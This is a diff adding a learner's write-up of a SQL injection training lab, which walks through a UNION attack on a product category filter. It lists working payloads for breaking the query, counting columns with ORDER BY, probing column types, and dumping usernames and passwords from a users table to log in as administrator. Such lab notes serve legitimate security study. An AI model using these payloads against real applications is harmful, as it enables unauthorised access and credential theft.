@@ -1,0 +1,29 @@
+LAB 05: SQL injection UNION attack, retrieving data from other tables
+
+VULNERABLE CATEGORY: Contain sqli in the product category filter
+
+ANALYSIS:
+1. We will be using single-quote(') to break the page how it respond at first
+***so it got me  a internal server error, might be possible of sqli there.
+
+2. I am commenting the rest of the queries (--) and check the page will be shown or not
+*** The page is showing completey fine so 100% sqli is there.
+
+3. Now, let's examine the number of columns present in that database
+*** For that we will be using the, ' ORDER BY 1-- (We will be increment the 1 each time)
+*** ' ORDER BY 1-- ==> showing page successfully 
+*** ' ORDER BY 2-- ==> showing the page successfully
+*** ' ORDER BY 3-- ==> shows me a internal server error so total number of columns is:
+         (3-1)=2
+
+ 4. Now we do know how many number of column is present in our database, now check for which datatype does the columns have:
+ *** The backend data-process like: SELECT a,b FROM product WHERE category='Gifts' 
+ ***  ' UNION SELECT 'a',NULL--  ==> 'a' shows successfully in the page this confirm that column 1 is of string type 
+ *** ' UNION SELECT 'a','b'--  ==> 'b' also shows successfully in the page this confirm that column 2 is also string datatype
+
+ 5. Now, getting the data from the tables;
+ ==> assuming that we have username and password two columns and name users table
+ *** ' UNION SELECT username,password FROM users--   ==> yes, I can see the password 
+ *** Now login as administrator and solve the lab  
+
+ NOW LETS EXPLOIT IT  
